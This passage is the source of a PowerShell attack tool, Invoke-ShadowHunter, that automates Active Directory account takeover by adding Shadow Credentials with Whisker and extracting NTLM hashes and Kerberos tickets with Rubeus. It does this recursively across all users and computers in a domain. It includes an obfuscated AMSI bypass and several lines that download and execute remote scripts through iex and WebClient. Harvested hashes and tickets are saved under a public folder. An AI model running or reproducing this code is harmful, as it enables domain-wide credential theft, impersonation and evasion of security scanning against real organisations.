function Invoke-ShadowHunter {
	
	<#

	.SYNOPSIS
	Invoke-ShadowHunter Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-ShadowHunter

	.DESCRIPTION
	Automate accounts takeover by abusing GenericWrite/GenericAll rights to add Shadow Credentials
	Dependencies: https://github.com/eladshamir/Whisker
	Dependencies: https://github.com/GhostPack/Rubeus
	
	.PARAMETER Domain
	Specify the target domain (default: current domain)
	
	.PARAMETER DomainController
	Specify the Domain Controller (default: will try to enumerate the DC)
	
	.PARAMETER CheckPoint
	Specify CheckPoint file to populate the table
	
	.PARAMETER Recursive
	Do the same process using each of the user/computer accounts we successfully owned
	
	.PARAMETER ClearRecursive
	Clear the Recursive status for each entry in the table
	
	.PARAMETER DoNotRestore
	Do not remove the added Shadow Credentials
	
	.PARAMETER StartAs
	Start the process as the specified Account
	
	.PARAMETER AddToTable
	Add credentials to the table (NTHash or Ticket)
	
	.PARAMETER UserName
	The Account to add credentials to within the table
	
	.PARAMETER NTHash
	The NT Hash to add to the table for the specified UserName
	
	.PARAMETER Ticket
	The TGT to add to the table for the specified UserName
	
	.PARAMETER KRBError
	Print Kerberos errors on screen
	
	.PARAMETER KeyCredentialError
	Print KeyCredential injection errors on screen
	
	.PARAMETER ShowTable
	Shows the results table and quits the script
	
	.PARAMETER GrabMyHash
	OPbtain the NT Hash for the current user you are running as
	
	.PARAMETER Sleep
	Set a sleep time between operations
	
	.EXAMPLE
	Invoke-ShadowHunter
	Invoke-ShadowHunter -Recursive
	Invoke-ShadowHunter -Recursive -GrabMyHash
	Invoke-ShadowHunter -Recursive -Domain contoso.local -DomainController DC01.ferrari.local
	Invoke-ShadowHunter -Recursive -StartAs Administrator
	Invoke-ShadowHunter -Recursive -KRBError -KeyCredentialError
	Invoke-ShadowHunter -AddToTable -UserName Administrator -NTHash CE5272EA6B6B949EA8ECC8FD0FB9AE57 -Ticket doIGTjCCBkq...ndBsNZmVycmFyaS5sb2NhbA==
	Invoke-ShadowHunter -ShowTable
	
	#>
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$DomainController,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$CheckPoint,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$StartAs,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$UserName,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$NTHash,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Ticket,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[int]
		$Sleep,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$AddToTable,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$Recursive,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$ClearRecursive,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$DoNotRestore,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$KRBError,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$KeyCredentialError,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$ShowTable,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$GrabMyHash,

		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$ShowErrors
		
	)
	
	clear

	Write-Output " _____                 _               _____ _               _               _    _             _            "
	Write-Output "|_   _|               | |             / ____| |             | |             | |  | |           | |           "
	Write-Output "  | |  _ ____   _____ | | _____ _____| (___ | |__   __ _  __| | _____      _| |__| |_   _ _ __ | |_ ___ _ __ "
	Write-Output "  | | | '_ \ \ / / _ \| |/ / _ \______\___ \| '_ \ / _`  |/ _`  |/ _ \ \ /\ / /  __  | | | | '_ \| __/ _ \ '__|"
	Write-Output " _| |_| | | \ V / (_) |   <  __/      ____) | | | | (_| | (_| | (_) \ V  V /| |  | | |_| | | | | ||  __/ |   "
	Write-Output "|_____|_| |_|\_/ \___/|_|\_\___|     |_____/|_| |_|\__,_|\__,_|\___/ \_/\_/ |_|  |_|\__,_|_| |_|\__\___|_|   "
	Write-Output "                                                                                                             "
	Write-Output " [+] Rob LP (@L3o4j) https://github.com/Leo4j"

	if(!$ShowErrors){
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
  	}
	Set-Variable MaximumHistoryCount 32767
	
	if($AddToTable){
		if($UserName){
			if($NTHash -OR $Ticket){}
			else{
				Write-Output ""
				Write-Output " [-] No Ticket nor NT_Hash provided"
				Write-Output ""
				break
			}
		}
		else{
			Write-Output ""
			Write-Output " [-] Please provide a UserName"
			Write-Output ""
			break
		}
	}
	
	if(!$ShowTable){
		if($Domain){
			$currentDomain = $Domain
		}
		else{
			# Call the function
			$currentDomain = Get-Domain
		}
		
		if($DomainController){}
		else{

			# Call the function
			$TempDCName = Get-DomainController -trgtdomain $currentDomain
			if($TempDCName){
				$DomainController = "$TempDCName.$currentDomain"
			}
			else{
				Write-Error "Failed to identify the Domain Controller."
			}
		}
		
		$LDAPSession = Establish-LDAPSession -SessionDomain $currentDomain
		
		$table = $null
	}
	
	if($CheckPoint){
		try{
			$table = Import-Clixml -Path "$CheckPoint"
		}
		catch{
			try{
				$table = Import-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
			}
			catch{
				
				# Define an empty array to store the hashtables
				$table = @()
				$table = Get-Table -TableDomain $currentDomain -TableDC $DomainController
			}
		}
	}
	
	else{
		try{
			$table = Import-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
		}
		catch{
			# Define an empty array to store the hashtables
			$table = @()
			$table = Get-Table -TableDomain $currentDomain -TableDC $DomainController
		}
	}
	
	if(!$ShowTable){
		if($ClearRecursive){
			foreach($Object in $table){
				$Object.Recursive = "NO"
			}
		}
	}
	
	if($AddToTable){
		Write-Output ""
		AddToTable -UserName $UserName -NTHash $NTHash -Ticket $Ticket -table $table -CheckPoint $CheckPoint
		Write-Output ""
		break
	}
	
	if($ShowTable){
		ShowTable -Feed $table -FunctionBreak
	}
	
	if(Test-Path -Path c:\Users\Public\Documents\ShadowHunter\){}
	else{New-Item -Path c:\Users\Public\Documents\ShadowHunter\ -ItemType Directory | Out-Null}
	
	if(Test-Path -Path c:\Users\Public\Documents\ShadowHunter\PFX\){}
	else{New-Item -Path c:\Users\Public\Documents\ShadowHunter\PFX\ -ItemType Directory | Out-Null}
	
	S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Whisker.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
	
	if($StartAs){
		
		$LDAPSession.Dispose()
		
		$KlistDump = klist
		$clientLine = $KlistDump | Where-Object { $_ -match "Client:\s+([^@]+)\s+@" }
		$clientName = $Matches[1].Trim()
		
		$tgtdeleg = Invoke-Rubeus tgtdeleg /nowrap | Out-String
		
		if($tgtdeleg -like "*ERROR*"){
			$GrabFromSession = Invoke-Rubeus dump /service:krbtgt /nowrap
			$OriginalUserTicket = $GrabFromSession.Substring($GrabFromSession.IndexOf('doI'))
			$OriginalUserTicket = $OriginalUserTicket.Trim()
		}
		
		else{
			$OriginalUserTicket = $tgtdeleg.Substring($tgtdeleg.IndexOf('doI'))
			$OriginalUserTicket = $OriginalUserTicket.Trim()
		}
		
		$OriginalClientInfo = $table | Where-Object { $_.Targets -eq $clientName }
		$OriginalClientInfo.TGT = $OriginalUserTicket
		
		if($GrabMyHash){
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-GrabTheHash/main/Invoke-GrabTheHash.ps1')
			$MyHash = Invoke-GrabTheHash -Domain $Object.Domain
			$MyHash = $MyHash | Out-String
			if($MyHash -match '([A-Fa-f0-9]{32})'){
				$MyHashValue = $matches[1]
				$OriginalClientInfo.NT_Hash = $MyHashValue
				$OriginalClientInfo.Compromised = "YES"
				$OriginalClientInfo.Compromised_As = "GrabTheHash"
				$OriginalClientInfo.Cert_Password = "No Password"
			}
			mv $pwd\$clientName.pfx C:\Users\Public\Documents\ShadowHunter\PFX\$clientName.pfx
		}
		
		$TargetClientInfo = $table | Where-Object { $_.Targets -eq $StartAs }
		$impDomain = $TargetClientInfo.Domain
		$impDC = $TargetClientInfo.DomainController
		$impAccount = $TargetClientInfo.Targets
		$impTicket = $TargetClientInfo.TGT
		$impHASH = $TargetClientInfo.NT_Hash
		
		if($impHASH){
			Write-Output ""		
			Write-Output " [+] Impersonating $StartAs"
			#klist purge > $null
			$ErrRB = Invoke-Rubeus asktgt /user:$impAccount /ntlm:$impHASH /domain:$impDomain /dc:$impDC /ptt
			
			if($ErrRB -like "*ERROR*"){
				$ErrRBlines = $ErrRB -split "`r`n"
				$ErrRBErrorLine = ($ErrRBlines | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
				if($KRBError){
					Write-Output " [-] $($impAccount): $ErrRBErrorLine"
				}
				
				Write-Output " [-] Impersonation via NT_Hash didn't succeed, trying with TGT"
				
				$ErrRB2 = Invoke-Rubeus ptt /ticket:$impTicket
				
				if($ErrRB2 -like "*ERROR*"){
					
					$ErrRBlines2 = $ErrRB2 -split "`r`n"
					$ErrRBErrorLine2 = ($ErrRBlines2 | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
					if($KRBError){
						Write-Output " [-] $($impAccount): $ErrRBErrorLine2"
					}
					
					Write-Output " [-] Impersonation via TGT didn't succeed"
					Write-Output ""
					break
				}	
			}
		}
		
		elseif($impTicket){
			Write-Output ""		
			Write-Output " [+] Impersonating $StartAs"
			Write-Output ""
			Write-Output " [-] $StartAs NT Hash missing from table, trying with TGT..."
			#klist purge > $null
			$ErrRB = Invoke-Rubeus ptt /ticket:$impTicket
			
			if($ErrRB -like "*ERROR*"){
				$ErrRBlines = $ErrRB -split "`r`n"
				$ErrRBErrorLine = ($ErrRBlines | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
				if($KRBError){
					Write-Output " [-] $($impAccount): $ErrRBErrorLine"
				}
				
				Write-Output " [-] Impersonation via TGT didn't succeed"
				Write-Output ""
				break
			}
		}
		
		else{
			Write-Output ""
			Write-Output " [-] $StartAs NT_Hash and TGT missing from table"
			Write-Output ""
			break
		}
		
		$LDAPSession = Establish-LDAPSession -SessionDomain $currentDomain
		
		if($Sleep){Start-Sleep -Milliseconds $Sleep}
	}
	
	$KlistDump = klist
	$clientLine = $KlistDump | Where-Object { $_ -match "Client:\s+([^@]+)\s+@" }
	$clientName = $Matches[1].Trim()
	
	Write-Output ""
	Write-Output "Target Domain:	$currentDomain"
	Write-Output "Target DC:	$DomainController"
	Write-Output "Running as:	$clientName"
	Write-Output ""
	
	# Find the target in the table using Select-Object
	$clientInfo = $table | Where-Object { $_.Targets -eq $clientName }

	if($clientInfo.Recursive -eq "YES"){$LDAPSession.Dispose()}
	
	else{
		
		$clientInfo.Recursive = "YES"
		
		$TotalCount = ($table | Where-Object { $_.Compromised -eq "NO" -and $_.Targets -ne $clientName }).Count
		
		$ProcessedCount = 0
		
		foreach ($Object in $table){
			if($Object.Compromised -eq "NO" -AND $Object.Targets -ne $clientName){
				
				# Increment the processed count
				$ProcessedCount++
				
				# Update progress bar
				$percentComplete = ($ProcessedCount / $TotalCount) * 100
				Write-Progress -PercentComplete $percentComplete -Status "Trying to add KeyCredential to the object" -Activity "$ProcessedCount of $TotalCount processed"
				
				$target = $null
				$target = $Object.Targets  
				$deviceId = $null
				$WhiskResults = $null
				$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
				$randomvalue = $randomvalue -join ""
				$WhiskResults = Invoke-Whisker -Command "add /target:$target /domain:$currentDomain /dc:$DomainController /path:c:\Users\Public\Documents\ShadowHunter\PFX\$target.pfx /password:$randomvalue"
				if($WhiskResults -notlike '*Access is denied.*' -AND $WhiskResults -like '*run Rubeus with the following syntax*'){
					$deviceId = [regex]::Match($WhiskResults, 'DeviceID (\S+)').Groups[1].Value
					
					# Update the hash table for the current object
					$Object.DeviceID = $deviceId
					$Object.Cert_Password = $randomvalue
					$Object.Compromised_As = $clientName
					$Object.Compromised = 'YES'
					
					$ntlmValue = $null
					$RubOutput = $null
					$base64Ticket = $null
					$RubOutput = Invoke-Rubeus asktgt /user:$target /certificate:c:\Users\Public\Documents\ShadowHunter\PFX\$target.pfx /password:$randomvalue /domain:$currentDomain /dc:$DomainController /getcredentials /nowrap
					if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
						$ntlmValue = $Matches[1]
						$base64Ticket = ((($RubOutput.Substring($RubOutput.IndexOf('doI'))) -split ' ')[0]).Trim()
						Write-Output "[+] $($target): $ntlmValue"
						#Write-Output ""
					}
					
					elseif($RubOutput -like "*ERROR*"){
						$Object.Error = 'YES'
						if($KRBError){
							$rublines = $RubOutput -split "`r`n"
							$RubErrorLine = ($rublines | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
							Write-Output "[-] $($target): $RubErrorLine"
						}
					}
					
					# upload values to table
					$Object.NT_Hash = $ntlmValue
					$Object.TGT = $base64Ticket
					
					# Clear keyLink
					if(!$DoNotRestore){
						Invoke-Whisker -Command "remove /target:$target /domain:$currentDomain /dc:$DomainController /deviceID:$deviceId" > $null
					}
					
				}
				
				elseif($WhiskResults -like '*Access is denied.*'){
					if($KeyCredentialError){
						$Whisklines = $WhiskResults -split "`r`n"
						$WhiskErrorLine = ($Whisklines | Where-Object { $_ -match "Access is denied" }) -replace "\[X\] "
						Write-Output "[-] $($target): $WhiskErrorLine"
					}
				}

    				elseif($WhiskResults -like '*Error executing the domain searcher*'){
					if($KeyCredentialError){
						$Whisklines = $WhiskResults -split "`r`n"
						$WhiskErrorLine = ($Whisklines | Where-Object { $_ -match "Error executing the domain searcher" }) -replace "\[X\] "
						Write-Output "[-] $($target): $WhiskErrorLine"
					}
				}
			}
		}
		
		$LDAPSession.Dispose()
		
		Write-Progress -Activity "Processing completed" -Status "Done" -PercentComplete 100 -Completed
	}
	
	#Recursive
	if($Recursive){
		
		if($CheckPoint){
			$table | Export-Clixml -Path "$CheckPoint"
			$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
		}
		else{$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"}
		
		$conditionMet = $False
		
		foreach ($Object in $table){
			if($Object.Recursive -eq "NO" -AND $Object.Compromised -eq "YES" -AND $Object.NT_Hash){
				$conditionMet = $true
				break
			}
		}
		
		$AllCompromised = $False
			
		foreach ($Object in $table){
			if($Object.Compromised -eq "NO"){
				$AllCompromised = $True
				break
			}
		}
		
		if($conditionMet -AND $AllCompromised){
			Write-Output ""
			Write-Output "Started Recursive..."
			
			if(!$StartAs){
				# grab current ticket
				$tgtdeleg = Invoke-Rubeus tgtdeleg /nowrap | Out-String
				
				if($tgtdeleg -like "*ERROR*"){
					$GrabFromSession = Invoke-Rubeus dump /service:krbtgt /nowrap
					$OriginalUserTicket = $GrabFromSession.Substring($GrabFromSession.IndexOf('doI'))
					$OriginalUserTicket = $OriginalUserTicket.Trim()
				}
				
				else{
					$OriginalUserTicket = $tgtdeleg.Substring($tgtdeleg.IndexOf('doI'))
					$OriginalUserTicket = $OriginalUserTicket.Trim()
				}
				
				# Save current user ticket to table
				$OriginalClientInfo = $table | Where-Object { $_.Targets -eq $clientName }
				$OriginalClientInfo.TGT = $OriginalUserTicket
				
				if($GrabMyHash){
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-GrabTheHash/main/Invoke-GrabTheHash.ps1')
					$MyHash = Invoke-GrabTheHash -Domain $Object.Domain
					$MyHash = $MyHash | Out-String
					if($MyHash -match '([A-Fa-f0-9]{32})'){
						$MyHashValue = $matches[1]
						$OriginalClientInfo.NT_Hash = $MyHashValue
						$OriginalClientInfo.Compromised = "YES"
						$OriginalClientInfo.Compromised_As = "GrabTheHash"
						$OriginalClientInfo.Cert_Password = "No Password"
					}
					mv $pwd\$clientName.pfx C:\Users\Public\Documents\ShadowHunter\PFX\$clientName.pfx
				}
			}
		}
		
		while($AllCompromised -AND $conditionMet){
			
			foreach ($Object in $table){
				
				if($AllCompromised -AND $conditionMet) {
				
					if($Object.Recursive -eq "NO" -AND $Object.NT_Hash){
						$Object.Recursive = 'YES'
						$target = $null
						$rc4 = $null
						$tgt = $null
						$tempdomain = $null
						$tempdc = $null
						$certlocation = $null
						$target = $Object.Targets
						$rc4 = $Object.NT_Hash
						$tgt = $Object.TGT
						$tempdomain = $Object.Domain
						$tempdc = $Object.DomainController
						$certlocation = "C:\Users\Public\Documents\ShadowHunter\PFX\$target.pfx"
						
						#klist purge > $null
						$RRB = Invoke-Rubeus asktgt /user:$target /ntlm:$rc4 /domain:$tempdomain /dc:$tempdc /ptt
						
						Write-Output ""
						Write-Output "Target Domain:	$tempdomain"
						Write-Output "Target DC:	$tempdc"
						Write-Output "Target:		$target"
						
						if($RRB -like "*ERROR*"){
							$rrblines = $RRB -split "`r`n"
							$RrbErrorLine = ($rrblines | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
							if($KRBError){
								Write-Output "[-] $($target): $RrbErrorLine"
							}
							
							Write-Output "[-] Impersonation via NT_Hash didn't succeed, trying with TGT"
							
							$RRB2 = Invoke-Rubeus ptt /ticket:$tgt
							
							if($RRB2 -like "*ERROR*"){
								
								$rrblines2 = $RRB2 -split "`r`n"
								$RrbErrorLine2 = ($rrblines2 | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
								if($KRBError){
									Write-Output "[-] $($target): $RrbErrorLine2"
								}
								
								Write-Output "[-] Impersonation via TGT didn't succeed, skipping..."
							
								$AllCompromised = $False
						
								foreach ($CheckObject in $table){
									if($CheckObject.Compromised -eq "NO"){
										$AllCompromised = $True
										break
									}
								}
								
								continue
							}
							
						}
						
						$SubKlistDump = $null
						$subclientLine = $null
						$subclientName = $null
						$SubKlistDump = klist
						$subclientLine = $SubKlistDump | Where-Object { $_ -match "Client:\s+([^@]+)\s+@" }
						$subclientName = $Matches[1].Trim()
						
						Write-Output "Running as:	$subclientName"
						Write-Output ""
						
						$LDAPSession = Establish-LDAPSession -SessionDomain $tempdomain
						
						if($Sleep){Start-Sleep -Milliseconds $Sleep}
						
						$TotalCount = ($table | Where-Object { $_.Compromised -eq "NO" }).Count
			
						$ProcessedCount = 0
						
						foreach ($SubObject in $table){
							if($SubObject.Compromised -eq "NO"){
								
								# Increment the processed count
								$ProcessedCount++
								
								# Update progress bar
								$percentComplete = ($ProcessedCount / $TotalCount) * 100
								Write-Progress -PercentComplete $percentComplete -Status "Trying to add KeyCredential to the object" -Activity "$ProcessedCount of $TotalCount processed"

								$subtarget = $null
								$subtarget = $SubObject.Targets
								$deviceId = $null
								$WhiskResults = $null
								$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
								$randomvalue = $randomvalue -join ""
								$WhiskResults = Invoke-Whisker -Command "add /target:$subtarget /domain:$currentDomain /dc:$DomainController /path:c:\Users\Public\Documents\ShadowHunter\PFX\$subtarget.pfx /password:$randomvalue"
								if($WhiskResults -notlike '*Access is denied.*' -AND $WhiskResults -like '*run Rubeus with the following syntax*'){
									$deviceId = [regex]::Match($WhiskResults, 'DeviceID (\S+)').Groups[1].Value
									
									# Update the hash table for the current object
									$SubObject.DeviceID = $deviceId
									$SubObject.Cert_Password = $randomvalue
									$SubObject.Compromised_As = $subclientName
									$SubObject.Compromised = 'YES'
									
									$ntlmValue = $null
									$base64Ticket = $null
									$RubOutput = $null
									$RubOutput = Invoke-Rubeus asktgt /user:$subtarget /certificate:c:\Users\Public\Documents\ShadowHunter\PFX\$subtarget.pfx /password:$randomvalue /domain:$currentDomain /dc:$DomainController /getcredentials /nowrap
									if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
										$ntlmValue = $Matches[1]
										$base64Ticket = ((($RubOutput.Substring($RubOutput.IndexOf('doI'))) -split ' ')[0]).Trim()
										Write-Output "[+] $($subtarget): $ntlmValue"
										#Write-Output ""
									}
									
									elseif($RubOutput -like "*ERROR*"){
										$SubObject.Error = 'YES'
										if($KRBError){
											$rublines = $RubOutput -split "`r`n"
											$RubErrorLine = ($rublines | Where-Object { $_ -match "ERROR" }) -replace "\[X\] "
											Write-Output "[-] $($subtarget): $RubErrorLine"
										}
									}
									
									# upload nt hash to table
									$SubObject.NT_Hash = $ntlmValue
									$SubObject.TGT = $base64Ticket
									
									# Clear keyLink
									if(!$DoNotRestore){
										Invoke-Whisker -Command "remove /target:$subtarget /domain:$currentDomain /dc:$DomainController /deviceID:$deviceId" > $null
									}
									
								}
								
								elseif($WhiskResults -like '*Access is denied.*'){
									if($KeyCredentialError){
										$Whisklines = $WhiskResults -split "`r`n"
										$WhiskErrorLine = ($Whisklines | Where-Object { $_ -match "Access is denied" }) -replace "\[X\] "
										Write-Output "[-] $($subtarget): $WhiskErrorLine"
									}
								}

 								elseif($WhiskResults -like '*Error executing the domain searcher*'){
									if($KeyCredentialError){
										$Whisklines = $WhiskResults -split "`r`n"
										$WhiskErrorLine = ($Whisklines | Where-Object { $_ -match "Error executing the domain searcher" }) -replace "\[X\] "
										Write-Output "[-] $($subtarget): $WhiskErrorLine"
									}
								}
							}
						}
						
						$LDAPSession.Dispose()
						
						Write-Progress -Activity "Processing completed" -Status "Done" -PercentComplete 100 -Completed
						
						if($CheckPoint){
							$table | Export-Clixml -Path "$CheckPoint"
							$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
						}
						else{$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"}
					}
					
					$AllCompromised = $False
					
					foreach ($CheckObject in $table){
						if($CheckObject.Compromised -eq "NO"){
							$AllCompromised = $True
							break
						}
					}
					
					$conditionMet = $False
					
					foreach ($Object in $table){
						if($Object.Recursive -eq "NO" -AND $Object.Compromised -eq "YES" -AND $Object.NT_Hash){
							$conditionMet = $true
							break
						}
					}
				}
				
				else{break}
			}
		}
	}
	
	if($Recursive -OR $StartAs){
		# restore ticket
		Invoke-Rubeus ptt /ticket:$OriginalUserTicket > $null
	}
	
	if($CheckPoint){
		ShowTable -Feed $table -SameLocation $CheckPoint
		$table | Export-Clixml -Path "$CheckPoint"
		$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
	}
	else{
		ShowTable -Feed $table
		$table | Export-Clixml -Path "C:\Users\Public\Documents\ShadowHunter\TableCheckpoint.xml"
	}
}

function Get-Domain {
	
	Add-Type -AssemblyName System.DirectoryServices
	
	try{
		$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		$RetrieveDomain = $RetrieveDomain.Name
	}
	catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	
	$RetrieveDomain
}

function Get-DomainController {
	param (
		[string]$trgtdomain
	)
	
	Add-Type -AssemblyName System.DirectoryServices

	# Create a DirectoryEntry object
	$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$trgtdomain")

	# Create a DirectorySearcher object
	$searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
	$searcher.Filter = "(objectClass=domainDNS)"
	$searcher.PropertiesToLoad.Add("fSMORoleOwner") > $null  # Redirect output to $null to keep the console clean

	# Perform the search
	$results = $searcher.FindOne()
	
	if ($results) {
		# Extract the FSMO role owner DN
		$pdcDn = $results.Properties["fsmoroleowner"][0]

		# Extract the DC name from the DN
		$dcNamePattern = "CN=([^,]+),CN=Servers," 
		if ($pdcDn -match $dcNamePattern) {
			return $matches[1] # Return the actual DC name
		} 
	} 
}

function Get-ADUsers {
	
	param (
		[string]$ADUsersDomain
	)
	
	Add-Type -AssemblyName System.DirectoryServices
	
	$domainDistinguishedName = "DC=" + ($ADUsersDomain -replace "\.", ",DC=")
	$targetdomain = "LDAP://$domainDistinguishedName"
	$searcher = New-Object System.DirectoryServices.DirectorySearcher
	$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry $targetdomain
	
	$ldapFilter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
	$searcher.Filter = $ldapFilter
	$searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
	$searcher.PropertiesToLoad.Add("msDS-UserPasswordExpiryTimeComputed") | Out-Null
	
	$allusers = $searcher.FindAll()

	$ADUsers = @()
	
	foreach ($user in $allusers) {
		$expiryTimeComputed = $user.Properties["msDS-UserPasswordExpiryTimeComputed"][0]

		# If password never expires, add the user to valid users list
		if ($expiryTimeComputed -eq [long]::MaxValue) {
			$ADUsers += $user.Properties["sAMAccountName"][0]
		} else {
			$passwordExpiryDate = [datetime]::FromFileTime($expiryTimeComputed)

			# Check if password is not expired
			if ($passwordExpiryDate -gt [datetime]::Now) {
				$ADUsers += $user.Properties["sAMAccountName"][0]
			} else {}
		}
	}
	
	$ADUsers = $ADUsers | Sort-Object
	
	$ADUsers

}

function Get-ADComputers {
	
	param (
		[string]$ADCompDomain
	)
	
	Add-Type -AssemblyName System.DirectoryServices
	
	$domainDistinguishedName = "DC=" + ($ADCompDomain -replace "\.", ",DC=")
	$targetdomain = "LDAP://$domainDistinguishedName"
	$searcher = New-Object System.DirectoryServices.DirectorySearcher
	$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry $targetdomain
	
	$ldapFilter = "(objectCategory=computer)"
	$searcher.Filter = $ldapFilter
	$allcomputers = $searcher.FindAll()

	$ADComputers = @()
	foreach ($computer in $allcomputers) {
		$ADComputers += $computer.Properties["name"][0] + "$"
	}
	$ADComputers = $ADComputers | Sort-Object
	
	$ADComputers
}

function Get-Table {
	
	param (
		[string]$TableDomain,
		[string]$TableDC
	)
	
	# Define an empty array to store the hashtables
	$functiontable = @()

	$Computers = @()
	$Computers = Get-ADComputers -ADCompDomain $TableDomain

	$Users = @()
	$Users = Get-ADUsers -ADUsersDomain $TableDomain

	# Loop through each computer and user to populate the table
	foreach ($target in ($Computers + $Users)) {
		$row = @{
			'Domain'         = $TableDomain
			'Targets'        = $target
			'Compromised'    = 'NO'
			'Compromised_As' = $null
			'DeviceID'       = $null
			'Cert_Password'  = $null
			'NT_Hash'        = $null
			'TGT'            = $null
			'Recursive'      = 'NO'
			'DomainController' = $TableDC
			'Error'      	 = 'NO'
		}

		# Add the hashtable to the table array
		$functiontable += @($row)
	}
	
	$functiontable
}

function ShowTable {
	
	param (
		[string]$SameLocation,
		[array]$Feed,
		[switch]$FunctionBreak
	)
	
	$ResultsTable = $null
	$ResultsTable = @()
	$SaveTable = $null
	$SaveTable = @()

	foreach($Object in $feed){

		$ResultsTable += [PSCustomObject]@{
			'Targets'        = $Object.Targets
			'Compromised'    = $Object.Compromised
			'Recursive'      = $Object.Recursive
			'Error'          = $Object.Error
			'NT_Hash'        = $Object.NT_Hash
			'Compromised_As' = $Object.Compromised_As
			'DeviceID'       = $Object.DeviceID
			'Cert_Password'  = $Object.Cert_Password
			'Domain'         = $Object.Domain
		}
	}

	#Write-Output ""
	$ResultsTable | Where-Object {$_.NT_Hash} | Format-Table -AutoSize

	
	$hashoutput = $null
	$hashoutput = @()
	
	$hashoutput = foreach ($line in $ResultsTable) {
		if($line.NT_Hash){
			$output = $line.Targets + "::aad3b435b51404eeaad3b435b51404ee:" + $line.NT_Hash + ":::"
			Write-Output $output
		}
	}
	
	$TGTEntries = $feed | Where-Object { $_.TGT }
	$TGTOutput = $TGTEntries | ForEach-Object { "$($_.Targets)`r`n$($_.TGT)`r`n" }
	
	if($FunctionBreak){break}
	
	if($SameLocation){
		$locationdirectory = Split-Path -Path $SameLocation
		$NTLocation = Join-Path -Path $locationdirectory -ChildPath "NTLM_Hashes.txt"
		$NTfilePath = "C:\Users\Public\Documents\ShadowHunter\NTLM_Hashes.txt"
		$ResultsLocation = Join-Path -Path $locationdirectory -ChildPath "Results.txt"
		$ResultsPath = "C:\Users\Public\Documents\ShadowHunter\Results.txt"
		$FullResultsLocation = Join-Path -Path $locationdirectory -ChildPath "Results_Full.txt"
		$FullResultsPath = "C:\Users\Public\Documents\ShadowHunter\Results_Full.txt"
